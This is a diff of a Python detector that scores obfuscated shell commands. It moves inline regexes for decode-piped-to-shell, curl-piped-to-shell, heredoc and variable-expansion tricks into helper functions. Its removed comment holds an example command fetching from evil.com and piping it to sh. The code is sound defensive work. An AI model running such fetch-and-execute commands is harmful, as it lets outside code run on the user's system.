@@ -19,6 +19,16 @@ import re
 from typing import Optional
 
 from .models import PostActionFinding, PostActionResponseTier
+from .risk_signals import (
+    has_decode_pipe_exec_command,
+    has_eval_decode_command,
+    has_heredoc_exec_command,
+    has_process_sub_remote_command,
+    has_remote_pipe_exec_command,
+    has_script_encoded_exec_command,
+    has_variable_exec_trigger_command,
+    has_variable_expansion_command,
+)
 from .text_utils import normalize_text
 
 logger = logging.getLogger(__name__)
@@ -119,28 +129,9 @@ _SAFE_CURL_PIPE_DOMAINS: frozenset[str] = frozenset({
 
 _OBFUSCATION_PATTERNS: list[tuple[re.Pattern, str]] = [
     (re.compile(p, f), pid) for p, f, pid in [
-        # Decode + pipe to shell
-        (r"base64\s+(?:-d|--decode)\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "base64-pipe-exec"),
-        (r"xxd\s+-r\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "hex-pipe-exec"),
-        (r"printf\s+.*\\x[0-9a-f]{2}.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "printf-pipe-exec"),
-        (r"eval[\s(].*(?:base64|xxd|printf|decode)", re.I, "eval-decode"),  # NOTE: [\s(] not \s+
-        # Remote fetch + pipe to shell
-        (r"(?:curl|wget)\s+.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "curl-pipe-shell"),
-        # Process substitution from remote
-        (r"(?:bash|sh|zsh)\s+<\(\s*(?:curl|wget)\b", re.I, "process-sub-remote"),
-        # Heredoc execution
-        (r"(?:sh|bash|zsh)\s+<<-?\s*['\"]?[a-zA-Z_]", re.I, "heredoc-exec"),
         # Escape sequence obfuscation
         (r"\$'(?:[^']*\\[0-7]{3}){2,}", 0, "octal-escape"),
         (r"\$'(?:[^']*\\x[0-9a-fA-F]{2}){2,}", 0, "hex-escape"),
-        # Scripting language with encoded execution
-        (r"(?:python[23]?|perl|ruby)\s+-[ec]\s+.*(?:base64|b64decode|decode|exec|eval)", re.I, "script-exec-encoded"),
-        # Variable expansion obfuscation (a=cu;b=rl;$a$b http://evil.com | sh)
-        # Split into two patterns to avoid nested repetition ReDoS:
-        # 1) Detect >=2 short var assignments followed by $ expansion
-        (r"(?:[a-zA-Z_]\w{0,2}=[^;\s]+;){2,}[^;$]{0,40}\$[a-zA-Z_{]", 0, "var-expansion"),
-        # 2) Detect $ expansion followed by execution indicators
-        (r"\$[a-zA-Z_{][^\n]{0,60}(?:\||>|`|/tmp/|/dev/|https?://)", 0, "var-exec-trigger"),
         # Existing patterns preserved
         (r"\[::-1\]", 0, "reverse-slice"),
         (r"\\x[0-9a-f]{2}", re.I, "hex-char"),
@@ -182,10 +173,25 @@ def detect_obfuscation(text: str) -> float:
     """Detect obfuscated code patterns. Returns 0.0-1.0."""
     normalized = normalize_text(text)
     hits = 0
+    if has_decode_pipe_exec_command(normalized):
+        hits += 1
+    if has_eval_decode_command(normalized):
+        hits += 1
+    if has_script_encoded_exec_command(normalized):
+        hits += 1
+    if has_process_sub_remote_command(normalized):
+        hits += 1
+    if has_heredoc_exec_command(normalized):
+        hits += 1
+    if has_variable_expansion_command(normalized):
+        hits += 1
+    if has_variable_exec_trigger_command(normalized):
+        hits += 1
+    if has_remote_pipe_exec_command(normalized):
+        if not (_is_safe_curl_pipe(text) and _is_safe_curl_pipe(normalized)):
+            hits += 1
     for pat, pid in _OBFUSCATION_PATTERNS:
         if pat.search(normalized):
-            if pid == "curl-pipe-shell" and _is_safe_curl_pipe(text) and _is_safe_curl_pipe(normalized):
-                continue
             hits += 1
     pattern_score = hits * 0.3
     entropy = _shannon_entropy(text)
